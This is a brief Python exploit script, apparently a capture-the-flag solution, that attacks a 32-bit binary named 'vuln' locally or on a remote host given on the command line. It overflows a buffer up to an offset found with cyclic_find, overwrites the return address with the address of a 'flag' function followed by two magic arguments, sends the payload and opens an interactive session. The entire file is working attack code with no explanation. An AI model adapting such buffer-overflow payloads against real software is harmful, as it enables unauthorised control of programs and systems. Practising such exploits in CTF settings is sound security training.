#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./vuln', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

    pl = cyclic_find(b'waab')*b'A'
    pl += p32(exe.sym.flag)
    pl += p32(0)
    pl += p32(0xDEADBEEF)
    pl += p32(0xC0DED00D)

    sl(pl)

    interactive()

if __name__ == '__main__':
    exploit()
